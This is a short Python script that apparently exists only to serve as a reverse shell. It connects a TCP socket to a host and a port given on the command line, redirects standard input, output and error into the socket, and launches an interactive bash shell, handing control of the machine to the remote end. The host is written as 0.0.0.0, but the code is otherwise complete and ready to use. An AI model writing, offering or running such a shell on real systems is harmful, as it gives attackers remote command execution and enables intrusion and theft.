#!/usr/bin/python
import socket,subprocess,os;
import sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("0.0.0.0",int(sys.argv[1])));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
